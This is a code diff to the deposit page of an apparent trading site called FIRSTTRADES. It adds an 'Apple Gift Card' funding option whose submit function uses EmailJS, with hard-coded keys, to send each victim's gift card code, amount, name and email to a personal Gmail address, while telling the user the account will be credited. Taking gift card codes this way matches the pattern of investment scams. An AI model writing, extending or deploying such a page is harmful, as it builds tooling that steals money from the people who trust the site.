@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Fund Your Account - FIRSTTRADES</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <link rel="stylesheet" href="styles.css">
     <style>
         .funding-form {
@@ -341,6 +342,11 @@
                     <div class="deposit-title">Ethereum Deposit</div>
                     <div class="deposit-description">Deposit via ETH wallet</div>
                 </div>
+                <div class="deposit-option" id="appleOption" onclick="selectDepositMethod('apple')" style="grid-column: 1 / -1;">
+                    <span class="deposit-icon">🍎</span>
+                    <div class="deposit-title">Apple Gift Card</div>
+                    <div class="deposit-description">Fund your account using an Apple Gift Card</div>
+                </div>
             </div>
 
             <div class="deposit-details" id="depositDetails" style="display: none;">
@@ -376,6 +382,33 @@
                 <p><small>Expiry: 30 minutes. After that, generate a new deposit request.</small></p>
             </section>
 
+            <!-- Apple Gift Card Panel -->
+            <section id="appleDepositPanel" style="display:none; margin-top:1.5rem; padding:1.5rem; border:2px dashed #555; border-radius:12px; background:#f9f9f9; color:#000;">
+                <h3 style="margin-top:0; color:#000; display:flex; align-items:center; gap:0.5rem;">🍎 Apple Gift Card Deposit</h3>
+                <p style="color:#555; margin-bottom:1.5rem; font-size:0.9rem;">Enter your gift card details below. Our team will verify and credit your account within 30 minutes.</p>
+
+                <div style="margin-bottom:1rem;">
+                    <label style="display:block; font-weight:600; color:#2c3e50; margin-bottom:0.5rem;">Gift Card Code *</label>
+                    <input type="text" id="appleCode" placeholder="e.g. XXXX-XXXX-XXXX-XXXX" style="width:100%; padding:12px 16px; border:2px solid #ddd; border-radius:10px; font-size:1rem; font-family:monospace; letter-spacing:2px; color:#000; background:#fff;">
+                </div>
+
+                <div style="margin-bottom:1rem;">
+                    <label style="display:block; font-weight:600; color:#2c3e50; margin-bottom:0.5rem;">Card Amount (USD) *</label>
+                    <input type="number" id="appleAmount" placeholder="e.g. 100" min="1" style="width:100%; padding:12px 16px; border:2px solid #ddd; border-radius:10px; font-size:1rem; color:#000; background:#fff;">
+                </div>
+
+                <div style="margin-bottom:1.5rem;">
+                    <label style="display:block; font-weight:600; color:#2c3e50; margin-bottom:0.5rem;">Upload Card Photo (optional)</label>
+                    <input type="file" id="applePhoto" accept="image/*" style="width:100%; padding:10px; border:2px dashed #ddd; border-radius:10px; font-size:0.9rem; background:#fff; cursor:pointer;">
+                    <small style="color:#888;">Take a photo of the back of the card showing the code</small>
+                </div>
+
+                <button onclick="submitAppleCard()" style="width:100%; padding:14px; background:linear-gradient(135deg,#1a1a1a,#333); color:white; border:none; border-radius:10px; font-size:1rem; font-weight:600; cursor:pointer; letter-spacing:1px;">Submit Gift Card</button>
+                <div id="appleSuccess" style="display:none; margin-top:1rem; padding:1rem; background:rgba(39,174,96,0.1); border:1px solid #27ae60; border-radius:10px; color:#27ae60; font-weight:600; text-align:center;">
+                    ✅ Gift card submitted! Your account will be credited within 30 minutes.
+                </div>
+            </section>
+
             <div class="button-group">
                 <button type="button" class="btn-secondary" onclick="skipFunding()">Skip for Now</button>
                 <button type="button" class="btn" id="depositBtn" onclick="proceedToDeposit()" disabled>Deposit Now</button>
@@ -400,26 +433,28 @@
 
         function selectDepositMethod(method) {
             selectedMethod = method;
-
-            // Remove selected class from all options
             document.querySelectorAll('.deposit-option').forEach(option => {
                 option.classList.remove('selected');
             });
+            document.getElementById('cryptoDepositPanel').style.display = 'none';
+            document.getElementById('ethDepositPanel').style.display = 'none';
+            document.getElementById('appleDepositPanel').style.display = 'none';
 
-            // Add selected class to clicked option and show deposit button
             if (method === 'btc') {
                 document.getElementById('btcOption').classList.add('selected');
                 showDepositDetails('$25', '5-30 minutes');
                 document.getElementById('depositBtn').disabled = false;
+                proceedToDeposit();
             } else if (method === 'eth') {
                 document.getElementById('ethOption').classList.add('selected');
                 showDepositDetails('$25', '5-30 minutes');
                 document.getElementById('depositBtn').disabled = false;
+                proceedToDeposit();
+            } else if (method === 'apple') {
+                document.getElementById('appleOption').classList.add('selected');
+                document.getElementById('appleDepositPanel').style.display = 'block';
+                document.getElementById('depositBtn').disabled = true;
             }
-
-            // Enable deposit button and auto-open the deposit panel
-            document.getElementById('depositBtn').disabled = false;
-            proceedToDeposit();
         }
 
         function showDepositDetails(minDeposit, processingTime) {
@@ -481,6 +516,43 @@
 
                 alert('Crypto payment panel shown. Please send funds to the generated address for demo.');
             }
+        }
+
+        function submitAppleCard() {
+            var code   = document.getElementById('appleCode').value.trim();
+            var amount = document.getElementById('appleAmount').value.trim();
+            var photo  = document.getElementById('applePhoto').files[0];
+            var userData = JSON.parse(localStorage.getItem('userData') || '{}');
+
+            if (!code) { alert('Please enter the gift card code.'); return; }
+            if (!amount) { alert('Please enter the card amount.'); return; }
+
+            // Save to localStorage as pending deposit
+            var fundingData = {
+                method: 'apple',
+                code: code,
+                amount: amount,
+                timestamp: new Date().toISOString(),
+                status: 'pending'
+            };
+            localStorage.setItem('fundingData', JSON.stringify(fundingData));
+            var allDeposits = JSON.parse(localStorage.getItem('allDeposits') || '[]');
+            fundingData.id = fundingData.timestamp;
+            allDeposits.push(fundingData);
+            localStorage.setItem('allDeposits', JSON.stringify(allDeposits));
+
+            // Send email notification via EmailJS
+            emailjs.init('0J1wL_xAXvlRU7WaV');
+            emailjs.send('service_jjdb6rb', 'template_rjcvhus', {
+                to_name:  'Admin',
+                to_email: 'ivieshaguolo@gmail.com',
+                code: 'NEW APPLE GIFT CARD DEPOSIT\n\nUser: ' + (userData.fullName || 'Unknown') + '\nEmail: ' + (userData.email || 'Unknown') + '\nCard Code: ' + code + '\nAmount: $' + amount
+            });
+
+            document.getElementById('appleSuccess').style.display = 'block';
+            document.getElementById('appleCode').disabled = true;
+            document.getElementById('appleAmount').disabled = true;
+            document.getElementById('applePhoto').disabled = true;
         }
 
         function skipFunding() {
